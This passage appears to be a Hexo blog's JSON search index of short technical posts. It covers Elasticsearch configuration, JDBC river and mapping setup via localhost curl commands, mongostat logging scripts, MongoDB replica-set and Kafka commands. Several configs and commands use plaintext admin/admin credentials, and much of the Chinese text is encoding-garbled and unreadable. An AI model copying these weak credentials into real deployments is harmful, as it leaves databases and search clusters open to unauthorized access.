#node.master: true # # Allow this node to store data (enabled by default): # #node.data: true # You can exploit these settings to design advanced cluster topologies. # # 1. You want this node to never become a master node, only to hold data. # This will be the &quot;workhorse&quot; of your cluster. # #node.master: false #node.data: true # # 2. You want this node to only serve as a master: to not store any data and # to have free resources. This will be the &quot;coordinator&quot; of your cluster. # #node.master: true #node.data: false # # 3. You want this node to be neither master nor data node, but # to act as a &quot;search load balancer&quot; (fetching data from nodes, # aggregating results, etc.) # #node.master: false #node.data: false # Use the Cluster Health API [http://localhost:9200/_cluster/health], the # Node Info API [http://localhost:9200/_nodes] or GUI tools # such as &lt;http://www.elasticsearch.org/overview/marvel/&gt;, # &lt;http://github.com/karmi/elasticsearch-paramedic&gt;, # &lt;http://github.com/lukas-vlcek/bigdesk&gt; and # &lt;http://mobz.github.com/elasticsearch-head&gt; to inspect the cluster state. # A node can have generic attributes associated with it, which can later be used # for customized shard allocation filtering, or allocation awareness. An attribute # is a simple key value pair, similar to node.key: value, here is an example: # #node.rack: rack314 # By default, multiple nodes are allowed to start from the same installation location # to disable it, set the following: #node.max_local_storage_nodes: 1 #################################### Index #################################### # You can set a number of options (such as shard/replica options, mapping # or analyzer definitions, translog settings, ...) for indices globally, # in this file. # # Note, that it makes more sense to configure index settings specifically for # a certain index, either when creating it or by using the index templates API. # # See &lt;http://elasticsearch.org/guide/en/elasticsearch/reference/current/index-modules.html&gt; and # &lt;http://elasticsearch.org/guide/en/elasticsearch/reference/current/indices-create-index.html&gt; # for more information. # Set the number of shards (splits) of an index (5 by default): # #index.number_of_shards: 5 # Set the number of replicas (additional copies) of an index (1 by default): # #index.number_of_replicas: 1 # Note, that for development on a local machine, with small indices, it usually # makes sense to &quot;disable&quot; the distributed features: # #index.number_of_shards: 1 #index.number_of_replicas: 0 # These settings directly affect the performance of index and search operations # in your cluster. Assuming you have enough machines to hold shards and # replicas, the rule of thumb is: # # 1. Having more *shards* enhances the _indexing_ performance and allows to # _distribute_ a big index across machines. # 2. Having more *replicas* enhances the _search_ performance and improves the # cluster _availability_. # # The &quot;number_of_shards&quot; is a one-time setting for an index. # # The &quot;number_of_replicas&quot; can be increased or decreased anytime, # by using the Index Update Settings API. # # Elasticsearch takes care about load balancing, relocating, gathering the # results from nodes, etc. Experiment with different settings to fine-tune # your setup. # Use the Index Status API (&lt;http://localhost:9200/A/_status&gt;) to inspect # the index status. #################################### Paths #################################### # Path to directory containing configuration (this file and logging.yml): # #path.conf: /path/to/conf # Path to directory where to store index data allocated for this node. # #path.data: /path/to/data # # Can optionally include more than one location, causing data to be striped across # the locations (a la RAID 0) on a file level, favouring locations with most free # space on creation. For example: # #path.data: /path/to/data1,/path/to/data2 # Path to temporary files: # #path.work: /path/to/work # Path to log files: # #path.logs: /path/to/logs # Path to where plugins are installed: # #path.plugins: /path/to/plugins #################################### Plugin ################################### # If a plugin listed here is not installed for current node, the node will not start. # #plugin.mandatory: mapper-attachments,lang-groovy ################################### Memory #################################### # Elasticsearch performs poorly when JVM starts swapping: you should ensure that # it _never_ swaps. # # Set this property to true to lock the memory: # #bootstrap.mlockall: true # Make sure that the ES_MIN_MEM and ES_MAX_MEM environment variables are set # to the same value, and that the machine has enough memory to allocate # for Elasticsearch, leaving enough memory for the operating system itself. # # You should also make sure that the Elasticsearch process is allowed to lock # the memory, eg. by using `ulimit -l unlimited`. ############################## Network And HTTP ############################### # Elasticsearch, by default, binds itself to the 0.0.0.0 address, and listens # on port [9200-9300] for HTTP traffic and on port [9300-9400] for node-to-node # communication. (the range means that if the port is busy, it will automatically # try the next port). # Set the bind address specifically (IPv4 or IPv6): # #network.bind_host: 192.168.0.1 # Set the address other nodes will use to communicate with this node. If not # set, it is automatically derived. It must point to an actual IP address. # #network.publish_host: 192.168.0.1 # Set both 'bind_host' and 'publish_host': # #network.host: 192.168.0.1 # Set a custom port for the node to node communication (9300 by default): # transport.tcp.port: 9533 # Enable compression for all communication between nodes (disabled by default): # #transport.tcp.compress: true # Set a custom port to listen for HTTP traffic: # http.port: 9002 # Set a custom allowed content length: # #http.max_content_length: 100mb # Disable HTTP completely: # #http.enabled: false ################################### Gateway ################################### # The gateway allows for persisting the cluster state between full cluster # restarts. Every change to the state (such as adding an index) will be stored # in the gateway, and when the cluster starts up for the first time, # it will read its state from the gateway. # There are several types of gateway implementations. For more information, see # &lt;http://elasticsearch.org/guide/en/elasticsearch/reference/current/modules-gateway.html&gt;. # The default gateway type is the &quot;local&quot; gateway (recommended): # #gateway.type: local # Settings below control how and when to start the initial recovery process on # a full cluster restart (to reuse as much local data as possible when using shared # gateway). # Allow recovery process after N nodes in a cluster are up: # #gateway.recover_after_nodes: 1 # Set the timeout to initiate the recovery process, once the N nodes # from previous setting are up (accepts time value): # #gateway.recover_after_time: 5m # Set how many nodes are expected in this cluster. Once these N nodes # are up (and recover_after_nodes is met), begin recovery process immediately # (without waiting for recover_after_time to expire): # #gateway.expected_nodes: 2 ############################# Recovery Throttling ############################# # These settings allow to control the process of shards allocation between # nodes during initial recovery, replica allocation, rebalancing, # or when adding and removing nodes. # Set the number of concurrent recoveries happening on a node: # # 1. During the initial recovery # #cluster.routing.allocation.node_initial_primaries_recoveries: 4 # # 2. During adding/removing nodes, rebalancing, etc # #cluster.routing.allocation.node_concurrent_recoveries: 2 # Set to throttle throughput when recovering (eg. 100mb, by default 20mb): # #indices.recovery.max_bytes_per_sec: 20mb # Set to limit the number of open concurrent streams when # recovering a shard from a peer: # #indices.recovery.concurrent_streams: 5 ################################## Discovery ################################## # Discovery infrastructure ensures nodes can be found within a cluster # and master node is elected. Multicast discovery is the default. # Set to ensure a node sees N other master eligible nodes to be considered # operational within the cluster. This should be set to a quorum/majority of # the master-eligible nodes in the cluster. # #discovery.zen.minimum_master_nodes: 1 # Set the time to wait for ping responses from other nodes when discovering. # Set this option to a higher value on a slow or congested network # to minimize discovery failures: # #discovery.zen.ping.timeout: 3s # For more information, see # &lt;http://elasticsearch.org/guide/en/elasticsearch/reference/current/modules-discovery-zen.html&gt; # Unicast discovery allows to explicitly control which nodes will be used # to discover the cluster. It can be used when multicast is not present, # or to restrict the cluster communication-wise. # # 1. Disable multicast discovery (enabled by default): # discovery.zen.ping.multicast.enabled: false discovery.zen.ping.unicast.hosts: [&quot;10.168.79.187:9533&quot;,&quot;10.168.87.18:9533&quot;] # # 2. Configure an initial list of master nodes in the cluster # to perform discovery when new nodes (master or data) are started: # #discovery.zen.ping.unicast.hosts: [&quot;host1&quot;, &quot;host2:port&quot;] # EC2 discovery allows to use AWS EC2 API in order to perform discovery. # # You have to install the cloud-aws plugin for enabling the EC2 discovery. # # For more information, see # &lt;http://elasticsearch.org/guide/en/elasticsearch/reference/current/modules-discovery-ec2.html&gt; # # See &lt;http://elasticsearch.org/tutorials/elasticsearch-on-ec2/&gt; # for a step-by-step tutorial. # GCE discovery allows to use Google Compute Engine API in order to perform discovery. # # You have to install the cloud-gce plugin for enabling the GCE discovery. # # For more information, see &lt;https://github.com/elasticsearch/elasticsearch-cloud-gce&gt;. # Azure discovery allows to use Azure API in order to perform discovery. # # You have to install the cloud-azure plugin for enabling the Azure discovery. # # For more information, see &lt;https://github.com/elasticsearch/elasticsearch-cloud-azure&gt;. ################################## Slow Log ################################## # Shard level query and fetch threshold logging. index.search.slowlog.threshold.query.warn: 10s index.search.slowlog.threshold.query.info: 5s index.search.slowlog.threshold.query.debug: 2s index.search.slowlog.threshold.query.trace: 500ms index.search.slowlog.threshold.fetch.warn: 1s index.search.slowlog.threshold.fetch.info: 800ms index.search.slowlog.threshold.fetch.debug: 500ms index.search.slowlog.threshold.fetch.trace: 200ms index.indexing.slowlog.threshold.index.warn: 10s index.indexing.slowlog.threshold.index.info: 5s index.indexing.slowlog.threshold.index.debug: 2s index.indexing.slowlog.threshold.index.trace: 500ms ################################## GC Logging ################################ #monitor.jvm.gc.young.warn: 1000ms #monitor.jvm.gc.young.info: 700ms #monitor.jvm.gc.young.debug: 400ms #monitor.jvm.gc.old.warn: 10s #monitor.jvm.gc.old.info: 5s #monitor.jvm.gc.old.debug: 2s ################################## Security ################################ # Uncomment if you want to enable JSONP as a valid return transport on the # http server. With this enabled, it may pose a security risk, so disabling # it unless you need it is recommended (it is disabled by default). # #http.jsonp.enable: true ################################## ik ################################ index: analysis: analyzer: ik: alias: [ik_analyzer] type: org.elasticsearch.index.analysis.IkAnalyzerProvider ik_max_word: type: ik use_smart: false ik_smart: type: ik use_smart: true ik_syno: type: custom tokenizer: ik filter: [my_synonym_filter] ik_syno_smart: type: custom tokenizer: ik filter: [my_synonym_filter] use_smart: true filter: my_synonym_filter: type: synonym_reloader synonyms_path: analysis/synonym.txt index.analysis.analyzer.default.type: ik ################################## http-basic ################################ http.basic.enabled: true http.basic.user: 'admin' http.basic.password: 'admin' http.basic.ipwhitelist: ['localhost', '127.0.0.1'] http.basic.trusted_proxy_chains: [] http.basic.log: false http.basic.xforward: '' ############################################################################# index.refresh_interval: 1s threadpool: index: type: fixed size: 100 queue_size: 1000 search: type: fixed size: 100 queue_size: 1000","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"mongostat","slug":"history/tech/59587efb3c6b907114565a3f","date":"2017-07-01T17:04:59.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59587efb3c6b907114565a3f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59587efb3c6b907114565a3f/","excerpt":"","text":"mongostat è„šæœ¬date &quot;+%Y-%m-%d-%H:%M:%S&quot;é”™è¯¯çš„ï¼š/data/mongodb/bin/mongostat -h 127.0.0.1 --port 27017 -u admin -p 'admin' --noheaders --discover |sed &quot;s/\\([0-9]\\{2\\}:[0-9]\\{2\\}:[0-9]\\{2\\}\\)/${today}-\\1/g;s/k\\|g\\|\\*\\|%//g;s/|/ /g;s/\\([a-zA-Z]\\+\\):/\\1 /g;/^$\\|no data\\|connected/d&quot; &gt;&gt; /data/logs/mongostat/${today}.log æ­£ç¡®çš„ï¼š/data/mongodb-3.0.3/bin/mongostat -h 127.0.0.1 --port 10000 -u admin -p 'admin' --authenticationDatabase admin --noheaders --discover | while read line; do today=`date &quot;+%Y-%m-%d&quot;`; echo $line | sed &quot;s/\\([0-9]\\{2\\}:[0-9]\\{2\\}:[0-9]\\{2\\}\\)/${today}-\\1/g;s/k\\|g\\|\\*\\|%//g;s/|/ /g;s/\\([a-zA-Z]\\+\\):/\\1 /g;/^$\\|no data\\|connected/d&quot; &gt;&gt; $today.log; done;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"mysql river å¢é‡æŸ¥è¯¢","slug":"history/tech/59587e763c6b907114565a3e","date":"2017-07-01T17:02:46.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59587e763c6b907114565a3e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59587e763c6b907114565a3e/","excerpt":"","text":"mysql river å¢é‡æŸ¥è¯¢ select id as _id,keyboard,title,ftitle,smalltext from ecms_news where lastdotime &gt; UNIX_TIMESTAMP(now())-100 curl -XPOST http://127.0.0.1:9200/groups/_mapping -d' { &quot;groups&quot;: { &quot;properties&quot;: { &quot;status&quot;: { &quot;type&quot;: &quot;integer&quot; }, &quot;name&quot;: { &quot;type&quot;: &quot;multi_field&quot;, &quot;fields&quot;: { &quot;name&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;store&quot;: &quot;yes&quot;, &quot;index&quot;: &quot;analyzed&quot;, &quot;indexAnalyzer&quot;: &quot;ik&quot;, &quot;searchAnalyzer&quot;: &quot;ik&quot; }, &quot;name_en&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;store&quot;: &quot;yes&quot;, &quot;index&quot;: &quot;analyzed&quot;, &quot;indexAnalyzer&quot;: &quot;pinyin_analyzer&quot;, &quot;searchAnalyzer&quot;: &quot;pinyin_analyzer&quot; } } }, &quot;desc&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;store&quot;: &quot;yes&quot;, &quot;index&quot;: &quot;analyzed&quot;, &quot;indexAnalyzer&quot;: &quot;ik&quot;, &quot;searchAnalyzer&quot;: &quot;ik&quot; } } } }'","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"elasticsearch mysql revier","slug":"history/tech/59587e1b3c6b907114565a3d","date":"2017-07-01T17:01:15.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59587e1b3c6b907114565a3d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59587e1b3c6b907114565a3d/","excerpt":"","text":"elasticsearch mysql revier curl -XPOST http://127.0.0.1:9002/news/_close curl -XPUT http://127.0.0.1:9002/news/_settings -d' { &quot;index&quot; : { &quot;analysis&quot; : { &quot;analyzer&quot; : { &quot;pinyin_analyzer&quot; : { &quot;tokenizer&quot; : &quot;my_pinyin&quot;, &quot;filter&quot; : [&quot;standard&quot;] } }, &quot;tokenizer&quot; : { &quot;my_pinyin&quot; : { &quot;type&quot; : &quot;pinyin&quot;, &quot;first_letter&quot; : &quot;append&quot;, &quot;padding_char&quot; : &quot; &quot; } } } } }' curl -XPOST http://127.0.0.1:9002/news/ms_ecms_article/_mapping -d' { &quot;ms_ecms_article&quot;: { &quot;properties&quot;: { &quot;keyboard&quot;: { &quot;type&quot;: &quot;multi_field&quot;, &quot;fields&quot;: { &quot;keyboard&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;store&quot;: &quot;yes&quot;, &quot;index&quot;: &quot;analyzed&quot;, &quot;indexAnalyzer&quot;: &quot;ik&quot;, &quot;searchAnalyzer&quot;: &quot;ik&quot; }, &quot;keyboard_en&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;store&quot;: &quot;yes&quot;, &quot;index&quot;: &quot;analyzed&quot;, &quot;indexAnalyzer&quot;: &quot;pinyin_analyzer&quot;, &quot;searchAnalyzer&quot;: &quot;pinyin_analyzer&quot; } } }, &quot;title&quot;: { &quot;type&quot;: &quot;multi_field&quot;, &quot;fields&quot;: { &quot;title&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;store&quot;: &quot;yes&quot;, &quot;index&quot;: &quot;analyzed&quot;, &quot;indexAnalyzer&quot;: &quot;ik&quot;, &quot;searchAnalyzer&quot;: &quot;ik&quot; }, &quot;title_en&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;store&quot;: &quot;yes&quot;, &quot;index&quot;: &quot;analyzed&quot;, &quot;indexAnalyzer&quot;: &quot;pinyin_analyzer&quot;, &quot;searchAnalyzer&quot;: &quot;pinyin_analyzer&quot; } } }, &quot;ftitle&quot;: { &quot;type&quot;: &quot;multi_field&quot;, &quot;fields&quot;: { &quot;ftitle&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;store&quot;: &quot;yes&quot;, &quot;index&quot;: &quot;analyzed&quot;, &quot;indexAnalyzer&quot;: &quot;ik&quot;, &quot;searchAnalyzer&quot;: &quot;ik&quot; }, &quot;ftitle_en&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;store&quot;: &quot;yes&quot;, &quot;index&quot;: &quot;analyzed&quot;, &quot;indexAnalyzer&quot;: &quot;pinyin_analyzer&quot;, &quot;searchAnalyzer&quot;: &quot;pinyin_analyzer&quot; } } }, &quot;smalltext&quot;: { &quot;type&quot;: &quot;multi_field&quot;, &quot;fields&quot;: { &quot;smalltext&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;store&quot;: &quot;yes&quot;, &quot;index&quot;: &quot;analyzed&quot;, &quot;indexAnalyzer&quot;: &quot;ik&quot;, &quot;searchAnalyzer&quot;: &quot;ik&quot; }, &quot;smalltext_en&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;store&quot;: &quot;yes&quot;, &quot;index&quot;: &quot;analyzed&quot;, &quot;indexAnalyzer&quot;: &quot;pinyin_analyzer&quot;, &quot;searchAnalyzer&quot;: &quot;pinyin_analyzer&quot; } } } } } }' curl -XPUT 'http://127.0.0.1:9002/_river/who_jdbc_river/_meta' -d '{ &quot;type&quot;: &quot;jdbc&quot;, &quot;jdbc&quot;: { &quot;driver&quot;: &quot;com.mysql.jdbc.Driver&quot;, &quot;url&quot;: &quot;jdbc:mysql://127.0.0.1:3306/news&quot;, &quot;user&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;, &quot;sql&quot;: &quot;select id as _id,keyboard,title,ftitle,smalltext from ecms_article&quot;, &quot;index&quot;: &quot;news&quot;, &quot;type&quot;: &quot;ms_ecms_article&quot;, &quot;bulk_size&quot;: 100, &quot;max_bulk_requests&quot;: 30, &quot;bulk_timeout&quot;: &quot;10s&quot;, &quot;flush_interval&quot;: &quot;5s&quot;, &quot;schedule&quot;: &quot;0 0-59 0-23 ? * *&quot; } }' curl -XDELETE '127.0.0.1:8379/_river/who_jdbc_river' curl -XPUT 'http://127.0.0.1:8379/_river/who_jdbc_river/_meta' -d '{ &quot;type&quot;: &quot;jdbc&quot;, &quot;jdbc&quot;: { &quot;driver&quot;: &quot;com.mysql.jdbc.Driver&quot;, &quot;url&quot;: &quot;jdbc:mysql://localhost:3306/profile&quot;, &quot;user&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;, &quot;sql&quot;: [ { &quot;statement&quot;: &quot;select id as _id,name,login_name from user where mytimestamp &gt; UNIX_TIMESTAMP(?)&quot;, &quot;parameter&quot;: [ &quot;$river.state.last_active_begin&quot; ] } ], &quot;index&quot;: &quot;profile&quot;, &quot;type&quot;: &quot;user&quot;, &quot;bulk_size&quot;: 100, &quot;max_bulk_requests&quot;: 30, &quot;bulk_timeout&quot;: &quot;10s&quot;, &quot;flush_interval&quot;: &quot;5s&quot;, &quot;schedule&quot;: &quot;0 0-59 0-23 ? * *&quot; } }' http://xbib.org/repository/org/xbib/elasticsearch/plugin/elasticsearch-river-jdbc/2.1.0.0/elasticsearch-river-jdbc-2.1.0.0-plugin.zip http://xbib.org/repository/org/xbib/elasticsearch/importer/elasticsearch-jdbc/2.1.0.0/elasticsearch-jdbc-2.1.0.0-dist.zip","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"elasticsearch èµ„æºåˆ—è¡¨","slug":"history/tech/595522fe49332b320bc50118","date":"2017-06-29T03:55:42.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/595522fe49332b320bc50118/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/595522fe49332b320bc50118/","excerpt":"","text":"elasticsearch èµ„æºåˆ—è¡¨ï¼šes.xiaoleilu.comå…¥é—¨ç¬”è®°1Elasticsearchå­¦ä¹ ç¬”è®°","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"mongodb å•èŠ‚ç‚¹è¿ç§»åˆ°å¤åˆ¶é›†","slug":"history/tech/59551f7049332b320bc50117","date":"2017-06-29T03:40:32.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59551f7049332b320bc50117/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59551f7049332b320bc50117/","excerpt":"","text":"å¢åŠ èŠ‚ç‚¹:rs0:PRIMARY&gt; rs.add(&quot;10.0.177.200:27017&quot;) rs0:PRIMARY&gt; rs.addArb(&quot;10.0.177.201:27017&quot;)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"Mongoä¸ESåŒæ­¥çš„5ç§æ–¹å¼","slug":"history/tech/59551cc049332b320bc50116","date":"2017-06-29T03:29:04.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59551cc049332b320bc50116/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59551cc049332b320bc50116/","excerpt":"","text":"Mongoä¸ESåŒæ­¥çš„5ç§æ–¹å¼","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"å‘ä¸ªå¸–æµ‹ä¸€ä¸‹1","slug":"history/training/59546cb63ac7f074423315a4","date":"2017-06-29T02:57:58.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/training/59546cb63ac7f074423315a4/","link":"","permalink":"https://wangxiuwen.github.io/history/training/59546cb63ac7f074423315a4/","excerpt":"","text":"å‘ä¸ªå¸–æµ‹ä¸€ä¸‹2","categories":[{"name":"åŸ¹è®­","slug":"åŸ¹è®­","permalink":"https://wangxiuwen.github.io/categories/%E5%9F%B9%E8%AE%AD/"}],"tags":[{"name":"training","slug":"training","permalink":"https://wangxiuwen.github.io/tags/training/"},{"name":"åŸ¹è®­","slug":"åŸ¹è®­","permalink":"https://wangxiuwen.github.io/tags/%E5%9F%B9%E8%AE%AD/"}],"author":"wangxiuwen"},{"title":"kafka hello world","slug":"history/tech/595455f767b4ebc07d5aee3a","date":"2017-06-29T01:20:55.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/595455f767b4ebc07d5aee3a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/595455f767b4ebc07d5aee3a/","excerpt":"","text":"kafka hello worldbin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test bin/kafka-console-consumer.sh --zookeeper localhost:2181 --topic test --from-beginning bin/kafka-console-producer.sh --broker-list localhost:9092 --topic test","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"kafka","slug":"kafka","permalink":"https://wangxiuwen.github.io/tags/kafka/"}],"author":"wangxiuwen"},{"title":"mac æç¤º Cannot connect to the Docker daemon. Is the docker daemon running on this host?","slug":"history/tech/5954556c67b4ebc07d5aee39","date":"2017-06-29T01:18:36.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5954556c67b4ebc07d5aee39/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5954556c67b4ebc07d5aee39/","excerpt":"","text":"è§£å†³ï¼ševal â€œ$(docker-machine env default)&quot;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"docker","slug":"docker","permalink":"https://wangxiuwen.github.io/tags/docker/"}],"author":"wangxiuwen"},{"title":"Logstashå¾€ESå‘æ•°æ®,  æŒ‡å®šæŸä¸ªå­—æ®µä¸åˆ†è¯","slug":"history/tech/595453e267b4ebc07d5aee38","date":"2017-06-29T01:12:02.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/595453e267b4ebc07d5aee38/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/595453e267b4ebc07d5aee38/","excerpt":"","text":"ç¤ºä¾‹ï¼š {&quot;flow_id&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;index&quot;: &quot;not_analyzed&quot;, &quot;doc_values&quot;: true }}","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"ç¨‹åºå‘˜ç½‘ç«™é›†åˆ","slug":"history/tech/5954defe672ca0410ae0f0e9","date":"2017-06-28T23:05:34.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5954defe672ca0410ae0f0e9/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5954defe672ca0410ae0f0e9/","excerpt":"","text":"http://longmenwaideyu.com/http://yeasy.github.io/https://timyang.nethttps://jayshao.com/archives/http://www.shenyanchao.cn/http://blog.codinglabs.org/http://www.hyjiacan.comhttps://toontong.github.iohttps://imququ.comæ»šé›ªçƒhttps://zhu327.github.io/http://www.zhuhengshu.com/https://riccardo.forina.mehttp://dmdgeeker.com/http://www.wisely.tophttps://www.androiddev.net/http://tonybai.comhttps://daryl.moehttps://g2ex.github.iohttp://www.winseliu.comhttps://briian.com/https://cokebar.infohttp://www.codexiu.cnhttp://www.opscoder.info/boltdb_intro.htmlhttp://www.cfad.tech/http://hardog.net/http://wiki.7diary.comhttps://alanli7991.github.io/https://www.codedump.info/https://zhgxun.github.io/å›½å¤–:https://www.kevinhooke.comhttps://morvanzhou.github.io/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"springbootçš„tomcatå¯åŠ¨è¿‡æ…¢çš„é—®é¢˜åˆ†æ","slug":"history/tech/5954d6ab5d68c4453ced2dc8","date":"2017-06-28T22:30:03.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5954d6ab5d68c4453ced2dc8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5954d6ab5d68c4453ced2dc8/","excerpt":"","text":"tomcatçš„å¯åŠ¨æ…¢ï¼Œ ç½ªé­ç¥¸é¦–æ˜¯ SecureRandomç±»ã€‚tomcat7ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œåœ¨å¯åŠ¨æ—¶ä¼šè°ƒç”¨SecureRandomç±»æ¥ç”Ÿæˆéšæœºæ•°ã€‚å¦‚æœç”¨äºåˆå§‹åŒ–SecureRandomçš„ç†µæºæ˜¯ä¸ªçŸ­ç†µï¼ˆç†µä¸å¤Ÿç”¨ï¼‰, å°±ä¼šæŠ¥ warningã€‚jdkçš„é…ç½®æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨ securerandom.source è®¾ç½®äº†ç†µæºï¼š cat 